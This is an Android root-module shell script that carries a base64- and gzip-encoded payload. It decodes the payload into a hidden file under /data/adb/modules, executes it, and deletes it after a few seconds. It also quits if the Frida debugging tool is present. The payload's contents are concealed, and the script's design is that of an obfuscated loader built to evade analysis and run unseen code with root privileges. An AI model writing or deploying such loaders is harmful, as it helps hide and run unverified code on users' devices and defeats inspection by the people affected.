#!/system/bin/sh
# =====================================
# 🔒 Protected by YUNAI Crypt Engine v2
# =====================================
P1='H4sIAAAAAAAAA61SXWsTQRR9318xbhXUh2xShDz1QShIES0URXwKabKQQmuEpKA0gW2+utumJpLGfG3TJhpba7NpQkx2s/n4Cf6HujM7+5S/4OxuCkJRrDgPw9x77j1n5sydu8WE3obC7AazuvaKCQWoJ8uLi0srC/TtLecd5n6Upl4srzz2WCnG7w17Ga9/ldkI+jfX2RDz8vnTh0se72Y46Jm3A4b+DwzUHMCTCkw2YL+hjUS9IsFRfjpMz5Kf2rjbgHxJV3nUrONEGYnnlM8PiOKVVJQGkQhg36yFgcui+7anDXiYSqJj2W5AwgmupdFh3ChlKV+A3Ae43W6AqgV9PLILHcQOs3fnDO6e4nGOaP8K6+UEzMRQ/gIA+DlmiJxZ2G/jizjKd20En3xE1SxBNXnvMpUjZKwvEAQEgc0CmA55+wRbChwc6IecTW98aRNBxlZBAmdSW+pE0W6YDgWK2qIAWaF1ln0NnA6XFVn0D34HuG4MzP+5w36NeK4NBrDfMYpJ3FKh0oPZNEpkNLWhybtwP4MliXyeme93UPGdXpMgn8LjU108glJ1ZqlURB+UZ4+M+ntjO2eW9zv6UQOVcjaOCseaqmqjPDro4a5iFkhlyPeMmkLGg4RImODWQJP3tWEZ17/iUhlu78z8tDhxizfOCj+42D+4EwUR4GCuzYaF0oCeHRb+al1VI1HQh0UyM3pFNrg6IG8zaiqcxDW5Sdy7C8AlV/8ukA3cu6kCZU2+k/oJSOO7k94DAAA='
P2=''
P3=''
P4=''
# 环境检查：如果在调试，直接退出
if grep -q "frida" /proc/self/maps 2>/dev/null; then exit 1; fi

# 生成临时执行文件 (后缀加 $$ 防止并发冲突)
TMP_EXEC="/data/adb/modules/YUNAI_auto_2/.sys_$$.sh"

# 组装并解密到本地隐藏文件
echo "$P1$P2$P3$P4" | base64 -d | gzip -d > "$TMP_EXEC"
chmod 700 "$TMP_EXEC"

# 【核心修复】使用 exec 替换当前进程！保证PID和环境上下文不丢失。
# 并在后台延迟5秒自动销毁临时文件
(sleep 5; rm -f "$TMP_EXEC") &
exec sh "$TMP_EXEC" "$@"
